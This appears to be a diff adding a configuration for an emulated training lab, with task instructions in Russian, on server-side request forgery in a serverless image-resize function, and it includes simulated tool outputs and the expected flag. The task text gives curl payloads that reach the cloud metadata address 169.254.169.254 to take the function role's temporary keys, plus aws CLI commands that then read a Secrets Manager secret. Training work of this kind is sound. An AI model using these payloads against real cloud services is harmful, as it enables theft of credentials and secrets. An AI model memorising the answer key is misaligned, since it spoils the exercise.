@@ -1,0 +1,30 @@
+{
+  "id": "web-serverless",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": { "file": "/home/student/task/found.txt", "contains": "nto{s3rv3rl3ss_ssrf_r0l3_cr3ds}" },
+  "fs": [
+    { "path": "/home/student/task", "type": "dir" },
+    { "path": "/home/student/task/task.md", "text": "# Практика: SSRF в serverless-функции\n\n`shop.local/api/resize` — облачная функция, принимающая URL картинки. У неё\nесть роль; ключи выдаёт служба метаданных.\n\n1. SSRF к метаданным — узнай имя роли (видно даже в ошибке):\n\n   curl -s 'https://shop.local/api/resize' -d 'url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'\n\n2. Забери временные ключи роли:\n\n   curl -s 'https://shop.local/api/resize' -d 'url=http://169.254.169.254/latest/meta-data/iam/security-credentials/shop-lambda-role'\n\n3. Ключи сохранены в окружение. Проверь роль и прочитай секрет из Secrets\n   Manager (в нём — флаг):\n\n   aws sts get-caller-identity\n   aws secretsmanager get-secret-value --secret-id prod/db | grep nto > found.txt\n\n4. Набери `check`.\n" }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция функции /api/resize)",
+      "cases": [
+        { "match": "security-credentials/shop-lambda-role", "example": "-s 'https://shop.local/api/resize' -d 'url=http://169.254.169.254/latest/meta-data/iam/security-credentials/shop-lambda-role'", "output": "{\"error\":\"... {\\\"AccessKeyId\\\":\\\"ASIAEXAMPLE\\\", \\\"SecretAccessKey\\\":\\\"wJalrXUtnFEMI\\\", \\\"Token\\\":\\\"IQoJb3JpZ2luX2VjE...\\\" }\"}\n" },
+        { "match": "security-credentials", "example": "-s 'https://shop.local/api/resize' -d 'url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'", "output": "{\"error\":\"no image at: shop-lambda-role\"}\n" },
+        { "match": "169\\.254\\.170\\.2", "example": "-s 'https://shop.local/api/resize' -d 'url=http://169.254.170.2/v2/credentials'", "output": "{\"error\":\"... container credentials ...\"}\n" }
+      ],
+      "fallback": "curl: в этой лабе эмулируется SSRF-ручка /api/resize на shop.local.\n"
+    },
+    "aws": {
+      "help": "aws <service> <action> [опции] — AWS CLI (эмуляция роли функции)",
+      "cases": [
+        { "match": "secretsmanager", "example": "secretsmanager get-secret-value --secret-id prod/db", "output": "{\n    \"Name\": \"prod/db\",\n    \"SecretString\": \"{\\\"password\\\":\\\"nto{s3rv3rl3ss_ssrf_r0l3_cr3ds}\\\"}\"\n}\n" },
+        { "match": "list-attached-role-policies", "example": "iam list-attached-role-policies --role-name shop-lambda-role", "output": "{ \"AttachedPolicies\": [{ \"PolicyName\": \"s3-full-access\" }] }\n" },
+        { "match": "get-caller-identity", "example": "sts get-caller-identity", "output": "{ \"Arn\": \"arn:aws:sts::123456789012:assumed-role/shop-lambda-role/shop-resize\" }\n" }
+      ],
+      "fallback": "aws: в этой лабе эмулируются sts/iam/secretsmanager для роли функции.\n"
+    }
+  }
+}
